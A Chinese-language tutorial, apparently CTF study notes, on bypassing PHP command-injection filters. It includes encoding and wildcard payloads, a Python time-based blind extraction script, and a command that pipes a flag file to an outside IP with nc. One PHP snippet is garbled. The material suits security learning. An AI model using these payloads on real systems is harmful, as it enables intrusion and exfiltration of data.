<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat&lt;flag.php</span><br><span class="line"></span><br><span class="line">?cmd=cat&lt;&gt;flag.php</span><br></pre></td></tr></table></figure>

<h3 id="4-09-Tab-20-space"><a href="#4-09-Tab-20-space" class="headerlink" title="4.%09(Tab),%20(space);"></a>4.%09(Tab),%20(space);</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat%09flag.php</span><br><span class="line"></span><br><span class="line">?cmd=cat%20flag.php</span><br></pre></td></tr></table></figure>

<h2 id="0x08-文件名过滤绕过"><a href="#0x08-文件名过滤绕过" class="headerlink" title="0x08.文件名过滤绕过"></a>0x08.文件名过滤绕过</h2><h3 id="1-通配符-绕过"><a href="#1-通配符-绕过" class="headerlink" title="1.通配符  ?  * 绕过"></a>1.通配符  ?  * 绕过</h3><p>通配符是一种特殊语句，主要有  ?   和   *   ,用来模糊搜索文件。</p>
<p>? 在linux里面可以进行代替字母。? 仅代表单个字符串，但此单子必须存在。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat fl?g.tx?</span><br></pre></td></tr></table></figure>

<p>* 在linux里面可以进行模糊匹配。 * 可以代表任何字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  f*</span><br></pre></td></tr></table></figure>

<p>多个匹配结果同时展示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&#x27;cat fl?g.p?p&#x27;);</span><br><span class="line"></span><br><span class="line">?cmd=passthru(&#x27;cat fl*&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="2-单引号、双引号绕过"><a href="#2-单引号、双引号绕过" class="headerlink" title="2.单引号、双引号绕过"></a>2.单引号、双引号绕过</h3><p> ‘’、””  代表空字符    即单引号与双引号会被解析为空字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&#x27;cat f&quot;&quot;ag.ph&quot;&quot;p&#x27;);    会被解析为   passthru(&#x27;cat flag.php&#x27;)  但可以绕过flag与php的过滤并执行命令</span><br><span class="line"></span><br><span class="line">echo fl&quot;ag.ph&quot;&quot;p   --&gt;flag.php</span><br></pre></td></tr></table></figure>

<h3 id="3-反斜杠-绕过"><a href="#3-反斜杠-绕过" class="headerlink" title="3.反斜杠  \   绕过"></a>3.反斜杠  \   绕过</h3><p>把特殊字符去掉功能性，单纯表示为字符串。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo benben &gt; dazhuang   会把benben  存入到dazhuang文件里</span><br><span class="line"></span><br><span class="line">echo benben \&gt; dazhuang  则会把  benben &gt; dazhuang 直接输出出来</span><br><span class="line"></span><br><span class="line">所以有  cat f\ag.p\hp   反斜杠  \   绕过</span><br></pre></td></tr></table></figure>

<h3 id="4-特殊变量-1到-9、-和-等"><a href="#4-特殊变量-1到-9、-和-等" class="headerlink" title="4.特殊变量:  $1到$9、$@和$*等"></a>4.特殊变量:  $1到$9、$@和$*等</h3><p>输出为空  空字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat  fl$1ag.t$9xt  -&gt;  cat flag.txt</span><br><span class="line"></span><br><span class="line">cat fl$*\ag.txt -&gt; cat flag.txt</span><br></pre></td></tr></table></figure>

<h3 id="5-内联执行"><a href="#5-内联执行" class="headerlink" title="5.内联执行"></a>5.内联执行</h3><p>自定义字符串，再拼接起来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=f;d=l;c=ag;d=ph;e=p;cat $a$b$c$d$e     就表示  cat flag.txt</span><br></pre></td></tr></table></figure>

<h3 id="6-利用linux中的环境变量"><a href="#6-利用linux中的环境变量" class="headerlink" title="6.利用linux中的环境变量"></a>6.利用linux中的环境变量</h3><p>使用环境变量里的字符执行命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH    PATH默认系统环境变量</span><br><span class="line"></span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games</span><br><span class="line"></span><br><span class="line">echo f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;g     $&#123;PATH:5:1&#125;就是从第五个字符开始  往后取一个字符即l  这里要从0开始数</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250421150744766.png" alt="image-20250421150744766"></p>
<h3 id="0x09-常见文件读取目录绕过"><a href="#0x09-常见文件读取目录绕过" class="headerlink" title="0x09.常见文件读取目录绕过"></a>0x09.常见文件读取目录绕过</h3><h3 id="1-tac：反向显示"><a href="#1-tac：反向显示" class="headerlink" title="1.tac：反向显示"></a>1.tac：反向显示</h3><p>与cat功能类似，但是是反向显示，从最后一行往前开始显示。</p>
<p><img src="/../picture/image-20250421151304944.png" alt="image-20250421151304944"></p>
<h3 id="2-more-一页一页的显示档案内容"><a href="#2-more-一页一页的显示档案内容" class="headerlink" title="2.more:一页一页的显示档案内容"></a>2.more:一页一页的显示档案内容</h3><h3 id="3-less：与more类似"><a href="#3-less：与more类似" class="headerlink" title="3.less：与more类似"></a>3.less：与more类似</h3><h3 id="4-tail：查看末尾几行；"><a href="#4-tail：查看末尾几行；" class="headerlink" title="4.tail：查看末尾几行；"></a>4.tail：查看末尾几行；</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&quot;tail fl\ag.ph\p&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250421151749762.png" alt="image-20250421151749762"></p>
<p><img src="/../picture/image-20250421151811509.png" alt="image-20250421151811509"></p>
<p>可以看到他是从  3   开始的显示了10行  即末尾10行</p>
<h3 id="5-nl：显示的时候，顺便输出行号"><a href="#5-nl：显示的时候，顺便输出行号" class="headerlink" title="5.nl：显示的时候，顺便输出行号"></a>5.nl：显示的时候，顺便输出行号</h3><p><img src="/../picture/image-20250421151932757.png" alt="image-20250421151932757"></p>
<h3 id="6-od：以二进制的方式读取档案内容；"><a href="#6-od：以二进制的方式读取档案内容；" class="headerlink" title="6.od：以二进制的方式读取档案内容；"></a>6.od：以二进制的方式读取档案内容；</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&quot;od -A d -c fla\g.ph\p&quot;);   这是以8进制的格式输出的</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250421152138076.png" alt="image-20250421152138076"></p>
<p>-A d -c 会把8进制 转换为 ASCII吗字符</p>
<p><img src="/../picture/image-20250421152454110.png" alt="image-20250421152454110"></p>
<h3 id="7-xxd：读取二进制文件"><a href="#7-xxd：读取二进制文件" class="headerlink" title="7.xxd：读取二进制文件"></a>7.xxd：读取二进制文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd flag.php  ?cmd=passthru(&quot;xxd flag.php&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250421152620707.png" alt="image-20250421152620707"></p>
<h3 id="8-sort：主要用于排序文件；"><a href="#8-sort：主要用于排序文件；" class="headerlink" title="8.sort：主要用于排序文件；"></a>8.sort：主要用于排序文件；</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort flag.php   ?cmd=passthru(&quot;sort flag.php&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250421152717253.png" alt="image-20250421152717253"></p>
<p>可以发现他把 10  和  11排前面去了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort在  /usr/bin/sort  里   有时会通过?cmd=passthru(&quot;/usr/bin/sort flag.php&quot;)执行</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250421152853353.png" alt="image-20250421152853353"></p>
<h3 id="9-uniq：报告或删除文件中重复的行；"><a href="#9-uniq：报告或删除文件中重复的行；" class="headerlink" title="9.uniq：报告或删除文件中重复的行；"></a>9.uniq：报告或删除文件中重复的行；</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uniq flag.php    ?cmd=passthru(&quot;uniq flag.php&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250421153101866.png" alt="image-20250421153101866"></p>
<p>可以看到uniq只输出了一次flag</p>
<h3 id="10-file-f-报错出具体内容"><a href="#10-file-f-报错出具体内容" class="headerlink" title="10.file -f; 报错出具体内容"></a>10.file -f; 报错出具体内容</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file -f flag.php   ?cmd=passthru(&quot;file -f flag.php&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250421153306972.png" alt="image-20250421153306972"></p>
<p>可以看到一些   No such file or directory   的报错  把内容给显示出来了</p>
<p>11.grep：在文本中查找指定字符串；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep flag flag.php     ?cmd=passthru(&quot;grep flag flag.php&quot;);</span><br></pre></td></tr></table></figure>

<p>从flag.php文本文件中搜索包含  flag  字符串的行  并显示</p>
<p><img src="/../picture/image-20250421153728835.png" alt="image-20250421153728835"></p>
<h2 id="0x10-编码绕过"><a href="#0x10-编码绕过" class="headerlink" title="0x10.编码绕过"></a>0x10.编码绕过</h2><p><img src="/../picture/qq_pic_merged_1745221195907.jpg" alt="qq_pic_merged_1745221195907"></p>
<h3 id="1-base64编码"><a href="#1-base64编码" class="headerlink" title="1.base64编码"></a>1.base64编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php-&gt;Y2F0IGZsYWcucGhw   (base64编码)</span><br><span class="line"></span><br><span class="line">echo Y2F0IGZsYWcucGhw | base64 -d     ?cmd=passthru(&#x27;`echo &quot;Y2F0IGZsYWcucGhw&quot;|base64 -d`&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250421154156960.png" alt="image-20250421154156960"></p>
<p>| 把前面指令执行的结果，变成后面指令的参数</p>
<p>上面echo Y2F0IGZsYWcucGhw | base64 -d</p>
<p>意思就是  echo Y2F0IGZsYWcucGhw的结果为Y2F0IGZsYWcucGhw</p>
<p>然后变成base64 -d Y2F0IGZsYWcucGhw   这里对Y2F0IGZsYWcucGhw解码  成为cat flag.php</p>
<p>echo Y2F0IGZsYWcucGhw|base64 -d | bash  执行命令</p>
<p>|  把cat flag.php，  放在bash里执行   bash里可以成功执行命令</p>
<p>还可以用  <code>echo Y2F0IGZsYWcucGhw|base64 -d</code>      $(echo Y2F0IGZsYWcucGhw|base64 -d)  等  </p>
<p><img src="/../picture/image-20250421154552855.png" alt="image-20250421154552855"></p>
<p><img src="/../picture/image-20250421154802665.png" alt="image-20250421154802665"></p>
<h3 id="2-base32编码"><a href="#2-base32编码" class="headerlink" title="2.base32编码"></a>2.base32编码</h3><h3 id="3-HEX编码"><a href="#3-HEX编码" class="headerlink" title="3.HEX编码"></a>3.HEX编码</h3><p>ASCII码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tac flag.php -&gt;74616320666c61672e706870</span><br><span class="line">echo &quot;74616320666c61672e706870&quot; | xxd -r -p | bash  </span><br><span class="line">?cmd=passthru(&#x27;echo &quot;74616320666c61672e706870&quot; | xxd -r -p | bash&#x27;);</span><br></pre></td></tr></table></figure>

<p>xxd:二进制显示和处理文件工具</p>
<p>-r -p将纯十六进制转储的反向输出打印为了ASCII格式</p>
<p>bash、sh、&#x2F;bin&#x2F;bash、反引号执行命令等</p>
<p><img src="/../picture/image-20250421155351564.png" alt="image-20250421155351564"></p>
<h3 id="4-shellcode编码"><a href="#4-shellcode编码" class="headerlink" title="4.shellcode编码"></a>4.shellcode编码</h3><p>16进制的机器码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tac flag.php -&gt;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70</span><br><span class="line"></span><br><span class="line">echo &quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;  </span><br><span class="line"></span><br><span class="line">printf &quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot; </span><br><span class="line"></span><br><span class="line">?cmd=passthru(&#x27;printf &quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot; | bash&#x27;);</span><br><span class="line">?cmd=passthru(&#x27;`printf &quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;`&#x27;);反引号、$()</span><br><span class="line">?cmd=system(&#x27;$(printf &quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;)&#x27;);system</span><br><span class="line">?cmd=passthru(&#x27;&#123;printf,&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;&#125;|bash&#x27;);</span><br><span class="line">这里用echo的话  可能无法正常执行命令</span><br></pre></td></tr></table></figure>

<p>这个会自动解码 不需要输入解码的命令</p>
<p><img src="/../picture/image-20250421155519127.png" alt="image-20250421155519127"></p>
<h2 id="0x11无回显时间盲注"><a href="#0x11无回显时间盲注" class="headerlink" title="0x11无回显时间盲注"></a>0x11无回显时间盲注</h2><h3 id="命令盲注"><a href="#命令盲注" class="headerlink" title="命令盲注"></a>命令盲注</h3><p>页面无法shell反弹或者无法回显，或者没有写入权限，可尝试命令盲注。</p>
<p>根据返回的时间来进行判断；</p>
<p>读取文件指定行的指定位置的字符；</p>
<p>if判断语句</p>
<h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h3><h4 id="1-sleep"><a href="#1-sleep" class="headerlink" title="1.sleep"></a>1.sleep</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep5  5秒之后返回结果</span><br></pre></td></tr></table></figure>

<h4 id="2-awk-NR"><a href="#2-awk-NR" class="headerlink" title="2.awk NR"></a>2.awk NR</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br><span class="line"></span><br><span class="line">hello</span><br><span class="line"></span><br><span class="line">Flag&#123;success!!&#125;</span><br></pre></td></tr></table></figure>

<p>awk逐行获取数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat flag | awk NR==1</span><br><span class="line"></span><br><span class="line">hello</span><br><span class="line"></span><br><span class="line">cat flag | awk NR==2</span><br><span class="line"></span><br><span class="line">Flag&#123;success!!&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250421224339689.png" alt="image-20250421224339689"></p>
<h4 id="3-cut-c"><a href="#3-cut-c" class="headerlink" title="3.cut -c"></a>3.cut -c</h4><p>cut命令逐列获取单个字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat flag | awk NR==12 | cut -c 1</span><br><span class="line"></span><br><span class="line">f</span><br><span class="line"></span><br><span class="line">cat flag | awk NR==12 | cut -c 2</span><br><span class="line"></span><br><span class="line">l</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250421224727636.png" alt="image-20250421224727636"></p>
<h4 id="4-if语句"><a href="#4-if语句" class="headerlink" title="4.if语句"></a>4.if语句</h4><p>判断命令是否执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if [ &quot;$(cat flag.php | awk &#x27;NR==12&#x27; | cut -c 1)&quot; == &quot;f&quot; ]; then echo &quot;right&quot;; fi</span><br><span class="line"></span><br><span class="line">if [ &quot;$(cat flag.php | awk &#x27;NR==12&#x27; | cut -c 1)&quot; == &quot;a&quot; ]; then echo &quot;right&quot;; fi</span><br></pre></td></tr></table></figure>

<p>if[]里的判断语句为真，则执行echo “right”；否则执行fi结束</p>
<p><img src="/../picture/image-20250421225909000.png" alt="image-20250421225909000"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if [ &quot;$(cat flag.php | awk &#x27;NR==12&#x27; | cut -c 1)&quot; == &quot;f&quot; ]; then sleep 5;fi</span><br></pre></td></tr></table></figure>

<p>if[]里判断语句为真，则执行sleep 5，休眠5秒后返回结果</p>
<p>py盲注脚本  ls &#x2F;查看根目录来获取flag文件名</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://192.168.1.6:19080/class08/1.php&quot;</span>  //改成自己的ip地址</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">55</span>):</span><br><span class="line">        <span class="comment">#asciiç è¡¨</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            k=<span class="built_in">chr</span>(k)</span><br><span class="line">            <span class="comment">#time.sleep(0.1)</span></span><br><span class="line">            payload = <span class="string">&quot;?cmd=&quot;</span> + <span class="string">f&quot;if [ `cat flag.php | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>` == <span class="subst">&#123;k&#125;</span> ];then sleep 2;fi&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url=url+payload, timeout=(<span class="number">1.5</span>,<span class="number">1.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result = result + k</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    result += <span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="0x12长度过滤绕过前置知识"><a href="#0x12长度过滤绕过前置知识" class="headerlink" title="0x12长度过滤绕过前置知识"></a>0x12长度过滤绕过前置知识</h2><h3 id="符号和-符号"><a href="#符号和-符号" class="headerlink" title="&gt;符号和 &gt;&gt;符号"></a>&gt;符号和 &gt;&gt;符号</h3><p>1.通过&gt;来创建文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo benben &gt; a </span><br></pre></td></tr></table></figure>

<p>创建文件a，并把字符串’benben’写入到文件a里；</p>
<p>通过&gt;来将命令执行结果写入文件会覆盖掉文件原本的内容；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; b  直接创建文件b   类似touch b</span><br></pre></td></tr></table></figure>

<p>2.通过&gt;&gt;追加内容</p>
<h3 id="命令换行"><a href="#命令换行" class="headerlink" title="命令换行"></a>命令换行</h3><p>在没有写完的命令后面加”\“,可以将一条命令写在多行:</p>
<p><img src="/../picture/image-20250422114101722.png" alt="image-20250422114101722"></p>
<p>相当于”\“把换行的命令连接到一起执行</p>
<h3 id="ls-t命令"><a href="#ls-t命令" class="headerlink" title="ls -t命令"></a>ls -t命令</h3><p>将文件名按照时间顺序排列出来(后创建的排在前面，即离我现在输入命令时间最近的在前面)</p>
<p>只能精确到秒</p>
<p>ls 是按字母顺序显示文件名（先符号后数字再字符）</p>
<h3 id="sh"><a href="#sh" class="headerlink" title="sh"></a>sh</h3><p>sh命令是shell命令语言解释器，</p>
<p>执行命令从标准输入读取或从一个文件中读取</p>
<h3 id="组合运用"><a href="#组合运用" class="headerlink" title="组合运用"></a>组合运用</h3><p>ls -t &gt;x</p>
<p>创建文件x</p>
<p>并把’ls -t’执行结果写入到文件x里；</p>
<p>ls -t 命令列出文件名。然后每个文件名按行储存；</p>
<p>对命令有长度限制时</p>
<p>把一些很短的文件名拼接成可执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;创建很短的文件名</span><br><span class="line">ls -t 按时间顺序列出文件名，按行存储</span><br><span class="line">\连接换行命令</span><br><span class="line">sh 从文件中读取命令</span><br></pre></td></tr></table></figure>

<h3 id="dir及-和rev"><a href="#dir及-和rev" class="headerlink" title="dir及 *和rev"></a>dir及 *和rev</h3><p><strong>dir：基本上和ls一样，但有两个好处</strong></p>
<p>一是开头字母是d，这使得它在alphabetical序中靠前；</p>
<p>二是按列输出，不换行。</p>
<p>***：相当于${dir <em>}</em>*</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dir *</span><br><span class="line">echo ffff</span><br><span class="line">$(dir *)      &gt;&gt;$(echo ffff)</span><br><span class="line">ffff</span><br><span class="line">*</span><br><span class="line">ffff</span><br></pre></td></tr></table></figure>

<p><img src="/../picture/image-20250422120439083.png" alt="image-20250422120439083"></p>
<p>如果第一个文件名是命令的话就会执行命令，</p>
<p>返回执行的结果，之后的文件名作为参数传入。</p>
<p><strong>rev：可以反转文件每一行内容。</strong></p>
<p><img src="/../picture/image-20250422120623141.png" alt="image-20250422120623141"></p>
<h2 id="0x13长度为7绕过方法"><a href="#0x13长度为7绕过方法" class="headerlink" title="0x13长度为7绕过方法"></a>0x13长度为7绕过方法</h2><p>期望执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag|nc 121.40.70.148 2333</span><br></pre></td></tr></table></figure>

<p>自己服务器的ip</p>
<p>监听端口7777</p>
<p>nc -lvp 2333</p>
<p>cat flag展示内容</p>
<p>再通过nc 反弹</p>
<p>提交到  自己服务器ip:2333</p>
<p>![6f967f4f03bac8012864b43ece5f2b4e](..&#x2F;picture&#x2F;qq聊天记录\Tencent Files\2719669919\nt_qq\nt_data\Pic\2025-04\Ori\6f967f4f03bac8012864b43ece5f2b4e.jpeg)</p>
<p>![](..&#x2F;picture&#x2F;qq聊天记录\Tencent Files\2719669919\nt_qq\nt_data\Pic\2025-04\Ori\7240b9b09083c57604e83d3ed1f561b1.jpeg)</p>
<h2 id="0x14长度为5"><a href="#0x14长度为5" class="headerlink" title="0x14长度为5"></a>0x14长度为5</h2><p>![d52626b21edc4f1f81b68dd7d1d06f4d](..&#x2F;picture&#x2F;qq聊天记录\Tencent Files\2719669919\nt_qq\nt_data\Pic\2025-04\Ori\d52626b21edc4f1f81b68dd7d1d06f4d.jpeg)</p>
<p>![8f0864797c369d6d23da65a097b6998a](..&#x2F;picture&#x2F;qq聊天记录\Tencent Files\2719669919\nt_qq\nt_data\Pic\2025-04\Ori\8f0864797c369d6d23da65a097b6998a.jpeg)</p>
<p>![cc7451361225ec7e8eb5983e1a17793e](..&#x2F;picture&#x2F;qq聊天记录\Tencent Files\2719669919\nt_qq\nt_data\Pic\2025-04\Ori\cc7451361225ec7e8eb5983e1a17793e.jpeg)</p>
<p>![7480448d92e6bd26b112f6e3a36b1938](..&#x2F;picture&#x2F;qq聊天记录\Tencent Files\2719669919\nt_qq\nt_data\Pic\2025-04\Ori\7480448d92e6bd26b112f6e3a36b1938.jpeg)</p>
<h2 id="0x15长度为4"><a href="#0x15长度为4" class="headerlink" title="0x15长度为4"></a>0x15长度为4</h2><p>![3ca5fd09aa1584c44259f7d088d973e8](..&#x2F;picture&#x2F;qq聊天记录\Tencent Files\2719669919\nt_qq\nt_data\Pic\2025-04\Ori\3ca5fd09aa1584c44259f7d088d973e8.jpeg)</p>
<p>![db3cde9e26b176f4ab6f6d716303d9c0](..&#x2F;picture&#x2F;qq聊天记录\Tencent Files\2719669919\nt_qq\nt_data\Pic\2025-04\Ori\db3cde9e26b176f4ab6f6d716303d9c0.jpeg)</p>
<p>![395380bf5c77e35c94502d543c10d0ce](..&#x2F;picture&#x2F;qq聊天记录\Tencent Files\2719669919\nt_qq\nt_data\Pic\2025-04\Ori\395380bf5c77e35c94502d543c10d0ce.jpeg)</p>
<p>![c1c41c2ff73aea67285dcdc7f5265de0](..&#x2F;picture&#x2F;qq聊天记录\Tencent Files\2719669919\nt_qq\nt_data\Pic\2025-04\Ori\c1c41c2ff73aea67285dcdc7f5265de0.jpeg)</p>
<h2 id="0x16无参数命令执行"><a href="#0x16无参数命令执行" class="headerlink" title="0x16无参数命令执行"></a>0x16无参数命令执行</h2><p>![b4eb5c3720bb080883ebc76e2c82553c](..&#x2F;picture&#x2F;qq聊天记录\Tencent Files\2719669919\nt_qq\nt_data\Pic\2025-04\Ori\b4eb5c3720bb080883ebc76e2c82553c.jpeg)</p>
<p><img src="/../picture/image-20250422202532230.png" alt="image-20250422202532230"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;,&quot;,$_GET[&#x27;code&#x27;])</span><br></pre></td></tr></table></figure>

<p>只要’code’里匹配到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[^\W]+\((?R)?\)</span><br></pre></td></tr></table></figure>

<p>则替换为空</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[^\W]+\((?R)?\)</span><br></pre></td></tr></table></figure>

<p>正则表达式**[^\W]**匹配字母、数字、下划线[A-Za-z0-9_]</p>
<p>**[^\W]+((?R)?)**匹配到”a()”形式的字符串，但是()内不能出现任何参数</p>
<p>(?R)代表递归，即a(b(c()))都能匹配到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">く?php</span><br><span class="line">Sa=<span class="string">&#x27;a()&#x27;</span>;.</span><br><span class="line"><span class="variable">$b</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>,<span class="string">&quot;, <span class="subst">$a</span>);</span></span><br><span class="line"><span class="string">print_r(<span class="subst">$b</span>);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>a()、a(b(c()))……格式的字符串，能被替换为空</p>
<p>$a&#x3D;’phpinfo();’,phpinfo()被替换为空，则$b&#x3D;’;’</p>
